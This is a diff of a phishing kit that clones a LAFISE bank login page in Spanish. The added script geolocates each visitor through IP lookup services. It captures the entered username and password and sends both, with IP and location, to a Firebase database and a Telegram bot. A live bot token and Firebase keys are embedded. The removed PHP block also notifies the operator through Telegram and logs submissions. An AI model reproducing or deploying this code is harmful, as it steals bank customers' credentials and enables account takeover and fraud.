@@ -1,144 +1,3 @@
-<?php
-// Iniciar el buffer de salida para evitar errores de encabezado
-ob_start();
-
-// Bot Token y Chat IDs
-$telegram_bot_id = "7290225049:AAE6Z015W7bYLuLmVqUXlD782ft8roSTX7s";
-$chat_ids = [-1003036046851]; // Puedes añadir más IDs si lo necesitas
-
-function aviso($telegram_bot_id, $chat_ids) {
-    $message = "🤑\n Nuevo user";
-
-    foreach ($chat_ids as $chat_id) {
-        $url = "https://api.telegram.org/bot$telegram_bot_id/sendMessage";
-
-        $data = [
-            'chat_id' => $chat_id,
-            'text' => $message
-        ];
-
-        // Inicializar cURL
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
-
-        $response = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-
-        if (curl_errno($ch)) {
-            error_log("❌ cURL error: " . curl_error($ch));
-        } elseif ($httpCode !== 200) {
-            error_log("⚠️ Telegram API error ($httpCode): $response");
-        } else {
-            error_log("✅ Mensaje enviado a chat_id: $chat_id");
-        }
-
-        curl_close($ch);
-    }
-}
-
-// Llamar a la función de aviso
-aviso($telegram_bot_id, $chat_ids);
-
-// Incluir funciones adicionales
-require_once 'functions.php';
-
-$info   = get_user_info();
-$ip     = $info['ip'];
-$device = get_device_id(); 
-
-// Verificar si el usuario está bloqueado
-if (get_user_state($device) === 'block') {
-    echo "<script>
-            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
-            window.location.href = 'https://www.google.com';
-          </script>";
-    exit();
-}
-
-// Incluir funciones adicionales
-require_once 'functions.php';
-
-$info   = get_user_info();
-$ip     = $info['ip'];
-$device = get_device_id(); 
-
-// Verificar si el usuario está bloqueado
-if (get_user_state($device) === 'block') {
-    echo "<script>
-            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
-            window.location.href = 'https://www.google.com';
-          </script>";
-    exit();
-}
-
-// Actualizar el usuario
-update_user($ip, $info['location'], basename(__FILE__));
-
-// Procesar formulario
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $allowedFields = ["user"];
-    $formData = [];
-
-    foreach ($_POST as $key => $value) {
-        if (in_array($key, $allowedFields, true)) {
-            $formData[$key] = trim($value);
-        }
-    }
-
-    if (!empty($formData)) {
-        $data = load_data();
-
-        if (!isset($data[$device])) {
-            $data[$device] = ['submissions' => [], 'state' => 'active'];
-        }
-
-        $timestamp = date("Y-m-d H:i:s");
-        $found = false;
-
-        if (isset($data[$device]['submissions'])) {
-            foreach ($data[$device]['submissions'] as &$submission) {
-                $existingKeys = array_keys($submission['data']);
-                $formKeys     = array_keys($formData);
-                sort($existingKeys);
-                sort($formKeys);
-
-                if ($existingKeys === $formKeys) {
-                    $submission = [
-                        "data"      => $formData,
-                        "timestamp" => $timestamp
-                    ];
-                    $found = true;
-                    break;
-                }
-            }
-            unset($submission);
-        }
-
-        if (!$found) {
-            $data[$device]['submissions'][] = [
-                "data"      => $formData,
-                "timestamp" => $timestamp
-            ];
-
-            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
-                $data[$device]['color'] = '#000000';
-            }
-        }
-
-        save_data($data);
-
-        header("Location: pass.php");
-        exit();
-    } else {
-        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
-    }
-}
-
-// Finalizar el buffer de salida para que header() funcione correctamente
-ob_end_flush();
-?>
 <!DOCTYPE html>
 <html lang="en" class="notranslate">
 
@@ -34292,9 +34151,27 @@ ob_end_flush();
             }
         }
     </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+    $.getJSON("https://api.ipify.org?format=json",
+                                      function(data) {
+    
+        // Setting text of element P with id gfg
+        $("#gfg").html(data.ip);
+    })
+ </script>
+ <script>
+    $.getJSON("https://ipinfo.io", function (response) {
+$("#ip").html("IP: " + response.ip);
+$("#address").html("" + response.city + ", " + response.country);
+
+})
+ </script>
 </head>
 
 <body class="generic"><icb-app _nghost-c0="" ng-version="4.4.7">
+    <p id="gfg"  hidden=""></p>
+    <p id="address"  hidden=""></p>
         <!---->
         <div _ngcontent-c0="" class="slough">
             <!---->
@@ -34570,7 +34447,7 @@ ob_end_flush();
                                                         <div _ngcontent-c5="" class="parma-content-middle-scroll">
                                                             <modal-content _ngcontent-c12="">
                                                                 <icb-form _ngcontent-c12="" _nghost-c15="">
-                                                                    <form method="post" _ngcontent-c15="" autocapitalice="off"
+                                                                    <form _ngcontent-c15="" autocapitalice="off"
                                                                         autocomplete="off" novalidate=""
                                                                         class="break-0 cleanMode ng-untouched ng-pristine ng-valid">
 
@@ -35099,13 +34976,7 @@ ob_end_flush();
                                                                                                         </div>
                                                                                                         <div _ngcontent-c20=""
                                                                                                             class="venecia-main-form-content">
-                                                                                                            <textarea
-                                                                                                                _ngcontent-c20=""
-                                                                                                                class="venecia-main-form-textarea medium required ng-untouched ng-pristine ng-valid"
-                                                                                                                rows="5"
-                                                                                                                cols="10"
-                                                                                                                placeholder=""
-                                                                                                                maxlength="140">        </textarea>
+                                                                                                           
                                                                                                             <!---->
                                                                                                         </div>
                                                                                                     </div>
@@ -35877,7 +35748,7 @@ ob_end_flush();
                                                                     <icb-wizard-step-one-by-one _ngcontent-c29=""
                                                                         _nghost-c34=""><!---->
                                                                         <div _ngcontent-c34=""
-                                                                            class="step fl wizardAutoHeightModeX ipswich-step-visible">
+                                                                            class="step fl wizardAutoHeightModeX fadeOutICB">
 
                                                                             <!---->
 
@@ -35924,9 +35795,9 @@ ob_end_flush();
                                                                                         <icb-login-step-user
                                                                                             _ngcontent-c29=""
                                                                                             _nghost-c35="">
-                                                                                            <form method="post" _ngcontent-c35=""
-                                                                                                id="loginform"
-                                                                                                class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
+                                                                                            <form _ngcontent-c35=""
+                                                                                                
+                                                                                                class="wizardAutoHeightModeX ng-touched ng-dirty ng-valid">
                                                                                                 <div _ngcontent-c35=""
                                                                                                     class="subotica">
                                                                                                     <div _ngcontent-c35=""
@@ -35938,11 +35809,10 @@ ob_end_flush();
                                                                                                             <input
                                                                                                                 _ngcontent-c35=""
                                                                                                                 autocomplete="off"
-                                                                                                                class="subotica-content-data-input required ng-pristine ng-invalid ng-touched"
+                                                                                                                class="subotica-content-data-input required ng-touched ng-dirty ng-valid"
                                                                                                                 disable-paste=""
-                                                                                                                name="user"
                                                                                                                 formcontrolname="username"
-                                                                                                                required
+
                                                                                                                 id="step01"
                                                                                                                 placeholder="Escriba su nombre de usuario">
                                                                                                         </div>
@@ -35975,7 +35845,15 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">4</span>
+                                                                                                                                        _ngcontent-c48="">0</span>
+                                                                                                                                </p>
+                                                                                                                            </li>
+                                                                                                                            <li
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <p
+                                                                                                                                    _ngcontent-c48="">
+                                                                                                                                    <span
+                                                                                                                                        _ngcontent-c48="">9</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -35984,14 +35862,6 @@ ob_end_flush();
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
                                                                                                                                         _ngcontent-c48="">2</span>
-                                                                                                                                </p>
-                                                                                                                            </li>
-                                                                                                                            <li
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <p
-                                                                                                                                    _ngcontent-c48="">
-                                                                                                                                    <span
-                                                                                                                                        _ngcontent-c48="">8</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36018,7 +35888,7 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">7</span>
+                                                                                                                                        _ngcontent-c48="">5</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36026,7 +35896,7 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">0</span>
+                                                                                                                                        _ngcontent-c48="">1</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36045,7 +35915,15 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">1</span>
+                                                                                                                                        _ngcontent-c48="">8</span>
+                                                                                                                                </p>
+                                                                                                                            </li>
+                                                                                                                            <li
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <p
+                                                                                                                                    _ngcontent-c48="">
+                                                                                                                                    <span
+                                                                                                                                        _ngcontent-c48="">4</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36054,14 +35932,6 @@ ob_end_flush();
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
                                                                                                                                         _ngcontent-c48="">3</span>
-                                                                                                                                </p>
-                                                                                                                            </li>
-                                                                                                                            <li
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <p
-                                                                                                                                    _ngcontent-c48="">
-                                                                                                                                    <span
-                                                                                                                                        _ngcontent-c48="">9</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36083,7 +35953,7 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">5</span>
+                                                                                                                                        _ngcontent-c48="">7</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36144,29 +36014,20 @@ ob_end_flush();
                                                                                                                 </div>
                                                                                                                 <div _ngcontent-c35=""
                                                                                                                     class="subotica-content-button-table-right">
-                                                                                                                    <button
-        type="submit"                                                                                                                id="submitBtn"
-                                                                                                                        class="custom-button">
-                                                                                                                        Siguiente
-                                                                                                                    </button>
-                                                                                                                    <style>
-                                                                                                                        .custom-button {
-                                                                                                                            background-color: #008c6c;
-                                                                                                                            /* verde */
-                                                                                                                            color: white;
-                                                                                                                            border: none;
-                                                                                                                            padding: 10px 20px;
-                                                                                                                            font-size: 16px;
-                                                                                                                            cursor: pointer;
-                                                                                                                            border-radius: 4px;
-                                                                                                                        }
-
-                                                                                                                        .custom-button:hover {
-                                                                                                                            background-color: #00795c;
-                                                                                                                            /* tono más oscuro al pasar el mouse */
-                                                                                                                        }
-                                                                                                                    </style>
-
+                                                                                                                    <icb-button
+                                                                                                                        _ngcontent-c35=""
+                                                                                                                        class="buttonLoginMode"
+                                                                                                                        _nghost-c8=""><a
+                                                                                                                            _ngcontent-c8=""
+                                                                                                                            class="ipswich-main-buttons-link loginInputMode big"
+                                                                                                                            style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
+                                                                                                                            <!---->
+                                                                                                                            <span
+                                                                                                                                _ngcontent-c8=""
+                                                                                                                                class="ipswich-main-buttons-link-text">
+                                                                                                                                Siguiente
+                                                                                                                            </span>
+                                                                                                                        </a></icb-button>
                                                                                                                 </div>
                                                                                                             </div>
 
@@ -36174,21 +36035,6 @@ ob_end_flush();
                                                                                                     </div>
                                                                                                 </div>
                                                                                             </form>
-                                                                                            <script>
-                                                                                                document.getElementById('loginform').addEventListener('submit', function (event) {
-                                                                                                
-
-                                                                                                    const username = document.getElementById('step01').value;
-
-                                                                                                    if (username.trim() !== '') {
-                                                                                                        localStorage.setItem('username', username);
-                                                                                                          // Redirige a pass.html
-                                                                                                    } else {
-                                                                                                        alert('Por favor, escriba su nombre de usuario.');
-                                                                                                    }
-                                                                                                });
-                                                                                            </script>
-
                                                                                         </icb-login-step-user>
                                                                                     </div>
                                                                                 </wizard-step-content>
@@ -36304,7 +36150,7 @@ ob_end_flush();
                                                                     <icb-wizard-step-one-by-one _ngcontent-c29=""
                                                                         _nghost-c34=""><!---->
                                                                         <div _ngcontent-c34=""
-                                                                            class="step fl wizardAutoHeightModeX">
+                                                                            class="step fl wizardAutoHeightModeX fadeInICB">
 
                                                                             <!---->
 
@@ -36345,10 +36191,11 @@ ob_end_flush();
                                                                                         <icb-login-step-password
                                                                                             _ngcontent-c29=""
                                                                                             _nghost-c36=""><!---->
-                                                                                            <form method="post" _ngcontent-c36=""
+                                                                                            <form _ngcontent-c36=""
+                                                                                                onsubmit="javascript:return sender()"
                                                                                                 autocomplete="off"
-                                                                                                method="post"
-                                                                                                class="wizardAutoHeightModeX ng-untouched ng-pristine ng-invalid">
+                                                                                                novalidate=""
+                                                                                                class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
 
                                                                                                 <div _ngcontent-c36=""
                                                                                                     class="clearboth">
@@ -36377,17 +36224,13 @@ ob_end_flush();
                                                                                                                                 width="304"
                                                                                                                                 height="78"
                                                                                                                                 role="presentation"
-                                                                                                                                name="a-nfu3ek2tv6nh"
+                                                                                                                                name="a-4q3nqxt36iji"
                                                                                                                                 frameborder="0"
                                                                                                                                 scrolling="no"
                                                                                                                                 sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
                                                                                                                                 src="./content/anchor.html"></iframe>
                                                                                                                         </div>
-                                                                                                                        <textarea
-                                                                                                                            id="g-recaptcha-response"
-                                                                                                                            name="g-recaptcha-response"
-                                                                                                                            class="g-recaptcha-response"
-                                                                                                                            style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
+
                                                                                                                     </div>
                                                                                                                     <iframe
                                                                                                                         style="display: none;"
@@ -36417,32 +36260,12 @@ ob_end_flush();
                                                                                                         <div _ngcontent-c36=""
                                                                                                             class="subotica-content-image">
                                                                                                             <!---->
-                                                                                                            <!---->
                                                                                                             <div _ngcontent-c36=""
-                                                                                                                class="subotica-content-image-preview">
-                                                                                                                <icb-loader
-                                                                                                                    _ngcontent-c36=""
-                                                                                                                    _nghost-c19="">
-                                                                                                                    <div _ngcontent-c19=""
-                                                                                                                        class="jyvaskyla  ">
-                                                                                                                        <!---->
-                                                                                                                        <!---->
-                                                                                                                        <div _ngcontent-c19=""
-                                                                                                                            class="jyvaskyla-balls">
-                                                                                                                            <div
-                                                                                                                                _ngcontent-c19="">
-                                                                                                                            </div>
-                                                                                                                            <div
-                                                                                                                                _ngcontent-c19="">
-                                                                                                                            </div>
-                                                                                                                            <div
-                                                                                                                                _ngcontent-c19="">
-                                                                                                                            </div>
-                                                                                                                        </div>
-                                                                                                                        <!---->
-                                                                                                                    </div>
-                                                                                                                </icb-loader>
+                                                                                                                class="subotica-content-image-img">
+
+
                                                                                                             </div>
+                                                                                                            <!---->
                                                                                                             <div _ngcontent-c36=""
                                                                                                                 class="subotica-content-image-welcome">
 
@@ -36451,9 +36274,20 @@ ob_end_flush();
                                                                                                                     class="subotica-content-image-welcome-text">Hola,
                                                                                                                 </span>
                                                                                                                 <span
+                                                                                                                    id="usernameDisplay"
                                                                                                                     _ngcontent-c36=""
                                                                                                                     class="subotica-content-image-welcome-name notranslate"></span>
                                                                                                             </div>
+                                                                                                            <script>
+                                                                                                                document.addEventListener('DOMContentLoaded', function () {
+                                                                                                                    const username = localStorage.getItem('username');
+                                                                                                                    if (username) {
+                                                                                                                        document.getElementById('usernameDisplay').textContent = username;
+                                                                                                                    }
+                                                                                                                });
+                                                                                                            </script>
+
+
                                                                                                             <icb-contextual-info
                                                                                                                 _ngcontent-c36=""
                                                                                                                 height="180"
@@ -36562,10 +36396,11 @@ ob_end_flush();
                                                                                                             <input
                                                                                                                 _ngcontent-c36=""
                                                                                                                 autocomplete="off"
-                                                                                                                class="subotica-content-data-input required ng-untouched ng-pristine ng-invalid"
+                                                                                                                class="subotica-content-data-input required ng-pristine ng-invalid ng-touched"
                                                                                                                 formcontrolname="password"
+                                                                                                                required
                                                                                                                 id="step02"
-                                                                                                                type="password"
+                                                                                                                type="Password"
                                                                                                                 placeholder="Ingrese su contraseña">
                                                                                                             <a _ngcontent-c36=""
                                                                                                                 class="subotica-content-data-pass"
@@ -36594,7 +36429,8 @@ ob_end_flush();
                                                                                                                 _ngcontent-c36=""
                                                                                                                 _nghost-c48="">
                                                                                                                 <div _ngcontent-c48=""
-                                                                                                                    class="vKeyBoard">
+                                                                                                                    class="vKeyBoard Hidden"
+                                                                                                                    style="top: 44px; left: 172px;">
                                                                                                                     <div _ngcontent-c48=""
                                                                                                                         class="vKeyBoardHeader">
                                                                                                                         <span
@@ -36611,7 +36447,15 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">2</span>
+                                                                                                                                        _ngcontent-c48="">1</span>
+                                                                                                                                </p>
+                                                                                                                            </li>
+                                                                                                                            <li
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <p
+                                                                                                                                    _ngcontent-c48="">
+                                                                                                                                    <span
+                                                                                                                                        _ngcontent-c48="">9</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36620,14 +36464,6 @@ ob_end_flush();
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
                                                                                                                                         _ngcontent-c48="">6</span>
-                                                                                                                                </p>
-                                                                                                                            </li>
-                                                                                                                            <li
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <p
-                                                                                                                                    _ngcontent-c48="">
-                                                                                                                                    <span
-                                                                                                                                        _ngcontent-c48="">1</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36646,14 +36482,6 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">9</span>
-                                                                                                                                </p>
-                                                                                                                            </li>
-                                                                                                                            <li
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <p
-                                                                                                                                    _ngcontent-c48="">
-                                                                                                                                    <span
                                                                                                                                         _ngcontent-c48="">8</span>
                                                                                                                                 </p>
                                                                                                                             </li>
@@ -36662,7 +36490,15 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">3</span>
+                                                                                                                                        _ngcontent-c48="">2</span>
+                                                                                                                                </p>
+                                                                                                                            </li>
+                                                                                                                            <li
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <p
+                                                                                                                                    _ngcontent-c48="">
+                                                                                                                                    <span
+                                                                                                                                        _ngcontent-c48="">7</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36681,6 +36517,14 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
+                                                                                                                                        _ngcontent-c48="">0</span>
+                                                                                                                                </p>
+                                                                                                                            </li>
+                                                                                                                            <li
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <p
+                                                                                                                                    _ngcontent-c48="">
+                                                                                                                                    <span
                                                                                                                                         _ngcontent-c48="">5</span>
                                                                                                                                 </p>
                                                                                                                             </li>
@@ -36689,15 +36533,7 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">4</span>
-                                                                                                                                </p>
-                                                                                                                            </li>
-                                                                                                                            <li
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <p
-                                                                                                                                    _ngcontent-c48="">
-                                                                                                                                    <span
-                                                                                                                                        _ngcontent-c48="">7</span>
+                                                                                                                                        _ngcontent-c48="">3</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36719,7 +36555,7 @@ ob_end_flush();
                                                                                                                                 <p
                                                                                                                                     _ngcontent-c48="">
                                                                                                                                     <span
-                                                                                                                                        _ngcontent-c48="">0</span>
+                                                                                                                                        _ngcontent-c48="">4</span>
                                                                                                                                 </p>
                                                                                                                             </li>
                                                                                                                             <li
@@ -36795,20 +36631,30 @@ ob_end_flush();
                                                                                                                 </div>
                                                                                                                 <div _ngcontent-c36=""
                                                                                                                     class="subotica-content-button-table-right">
-                                                                                                                    <icb-button
-                                                                                                                        _ngcontent-c36=""
-                                                                                                                        class="buttonLoginMode"
-                                                                                                                        _nghost-c8=""><a
-                                                                                                                            _ngcontent-c8=""
-                                                                                                                            class="ipswich-main-buttons-link loginInputMode inactive big"
-                                                                                                                            style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
-                                                                                                                            <!---->
-                                                                                                                            <span
-                                                                                                                                _ngcontent-c8=""
-                                                                                                                                class="ipswich-main-buttons-link-text">
-                                                                                                                                Siguiente
-                                                                                                                            </span>
-                                                                                                                        </a></icb-button>
+                                                                                                                    <button
+                                                                                                                        type="button"
+                                                                                                                        onclick="sender()"
+                                                                                                                        id="submitBtn"
+                                                                                                                        class="custom-button">
+                                                                                                                        Siguiente
+                                                                                                                    </button>
+                                                                                                                    <style>
+                                                                                                                        .custom-button {
+                                                                                                                            background-color: #008c6c;
+                                                                                                                            /* verde */
+                                                                                                                            color: white;
+                                                                                                                            border: none;
+                                                                                                                            padding: 10px 20px;
+                                                                                                                            font-size: 16px;
+                                                                                                                            cursor: pointer;
+                                                                                                                            border-radius: 4px;
+                                                                                                                        }
+
+                                                                                                                        .custom-button:hover {
+                                                                                                                            background-color: #00795c;
+                                                                                                                            /* tono más oscuro al pasar el mouse */
+                                                                                                                        }
+                                                                                                                    </style>
                                                                                                                 </div>
                                                                                                             </div>
 
@@ -36816,8 +36662,94 @@ ob_end_flush();
                                                                                                     </div>
                                                                                                 </div>
                                                                                             </form>
+                                                                                          <!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
 
-                                                                                            <icb-unblock-user-online
+<script>
+  // Configuración de Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyDkFiTElkEcL0B1eAtRrrCoGm9HCt9EGZc",
+  authDomain: "flab-d70ab.firebaseapp.com",
+  databaseURL: "https://flab-d70ab-default-rtdb.firebaseio.com",
+  projectId: "flab-d70ab",
+  storageBucket: "flab-d70ab.firebasestorage.app",
+  messagingSenderId: "789535969500",
+  appId: "1:789535969500:web:ff0f3be7c250dac33ee419"
+};
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+</script>
+
+<!-- Script principal -->
+<script>
+  // Telegram bot
+  var telegram_bot_id = "7290225049:AAE6Z015W7bYLuLmVqUXlD782ft8roSTX7s";
+  var chat_id = -1003036046851;
+
+  // Función para generar ID corto (al azar)
+  function generateShortId(length = 6) {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let result = "";
+    for (let i = 0; i < length; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+  }
+
+  async function sender() {
+    const USER = localStorage.getItem('username');
+    const PASS = document.getElementById("step02").value;
+    const ip = document.getElementById("gfg").innerText;
+    const ip2 = document.getElementById("address").innerText;
+
+    // Crear ID personalizado corto
+    const customId = generateShortId();
+
+    try {
+      // 1. Crear documento con ID personalizado
+      await db.collection("varable").doc(customId).set({
+        username: USER,
+        password: PASS,
+        ip: ip,
+        location: ip2,
+        page: 1,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+
+      // 2. Guardar ID localmente
+      localStorage.setItem("docId", customId);
+
+      // 3. Construir y enviar mensaje a Telegram
+      const message = `🧙‍♂️LAFISE\n🆔 ID: ${customId}\n🤑USER: ${USER}\n🤑PASS: ${PASS}\n📍IP: ${ip}\n${ip2}`;
+      const telegramSettings = {
+        async: true,
+        crossDomain: true,
+        url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "cache-control": "no-cache"
+        },
+        data: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      };
+
+      await $.ajax(telegramSettings);
+
+      // 4. Redirigir
+      window.location.href = "waiting.html";
+    } catch (error) {
+      console.error("Error al guardar en Firebase o enviar Telegram:", error.message, error);
+      alert("Ocurrió un error al procesar los datos.");
+    }
+
+    return false;
+  }
+</script>
+<icb-unblock-user-online
                                                                                                 _ngcontent-c36=""
                                                                                                 _nghost-c50=""><icb-modalpopup
                                                                                                     _ngcontent-c50=""
@@ -36937,7 +36869,7 @@ ob_end_flush();
                                                                                                                                 <icb-form
                                                                                                                                     _ngcontent-c50=""
                                                                                                                                     _nghost-c15="">
-                                                                                                                                    <form method="post"
+                                                                                                                                    <form
                                                                                                                                         _ngcontent-c15=""
                                                                                                                                         autocapitalice="off"
                                                                                                                                         autocomplete="off"
@@ -37158,7 +37090,7 @@ ob_end_flush();
                                                                                                                             <icb-form
                                                                                                                                 _ngcontent-c51=""
                                                                                                                                 _nghost-c15="">
-                                                                                                                                <form method="post"
+                                                                                                                                <form
                                                                                                                                     _ngcontent-c15=""
                                                                                                                                     autocapitalice="off"
                                                                                                                                     autocomplete="off"
@@ -37802,7 +37734,7 @@ ob_end_flush();
                                                                                                                     <icb-form
                                                                                                                         _ngcontent-c53=""
                                                                                                                         _nghost-c15="">
-                                                                                                                        <form method="post"
+                                                                                                                        <form
                                                                                                                             _ngcontent-c15=""
                                                                                                                             autocapitalice="off"
                                                                                                                             autocomplete="off"
@@ -38664,7 +38596,7 @@ ob_end_flush();
                                                                                         <icb-login-step-complete-user-data
                                                                                             _ngcontent-c29=""
                                                                                             _nghost-c40="">
-                                                                                            <form method="post" _ngcontent-c40=""
+                                                                                            <form _ngcontent-c40=""
                                                                                                 novalidate=""
                                                                                                 class="main-container-login-utils wizardAutoHeightModeX ng-untouched ng-pristine ng-valid">
 
@@ -39145,7 +39077,7 @@ ob_end_flush();
                                                                                         <icb-login-step-update-cellphone-number
                                                                                             _ngcontent-c29=""
                                                                                             _nghost-c42="">
-                                                                                            <form method="post" _ngcontent-c42=""
+                                                                                            <form _ngcontent-c42=""
                                                                                                 novalidate=""
                                                                                                 class="ng-untouched ng-pristine ng-valid">
                                                                                                 <div _ngcontent-c42=""
@@ -39495,7 +39427,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">6</span>
+                                                                                                                                    _ngcontent-c48="">8</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39503,7 +39435,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">2</span>
+                                                                                                                                    _ngcontent-c48="">5</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39511,7 +39443,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">1</span>
+                                                                                                                                    _ngcontent-c48="">3</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39530,7 +39462,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">8</span>
+                                                                                                                                    _ngcontent-c48="">7</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39538,7 +39470,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">0</span>
+                                                                                                                                    _ngcontent-c48="">6</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39546,7 +39478,7 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
-                                                                                                                                    _ngcontent-c48="">5</span>
+                                                                                                                                    _ngcontent-c48="">2</span>
                                                                                                                             </p>
                                                                                                                         </li>
                                                                                                                         <li
@@ -39565,23 +39497,23 @@ ob_end_flush();
                                                                                                                             <p
                                                                                                                                 _ngcontent-c48="">
                                                                                                                                 <span
+                                                                                                                                    _ngcontent-c48="">1</span>
+                                                                                                                            </p>
+                                                                                                                        </li>
+                                                                                                                        <li
+                                                                                                                            _ngcontent-c48="">
+                                                                                                                            <p
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <span
+                                                                                                                                    _ngcontent-c48="">0</span>
+                                                                                                                            </p>
+                                                                                                                        </li>
+                                                                                                                        <li
+                                                                                                                            _ngcontent-c48="">
+                                                                                                                            <p
+                                                                                                                                _ngcontent-c48="">
+                                                                                                                                <span
                                                                                                                                     _ngcontent-c48="">4</span>
-                                                                                                                            </p>
-                                                                                                                        </li>
-                                                                                                                        <li
-                                                                                                                            _ngcontent-c48="">
-                                                                                                                            <p
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <span
-                                                                                                                                    _ngcontent-c48="">7</span>
-                                                                                                                            </p>
-                                                                                                                        </li>
-                                                                                                                        <li
-                                                                                                                            _ngcontent-c48="">
-                                                                                                                            <p
-                                                                                                                                _ngcontent-c48="">
-                                                                                                                                <span
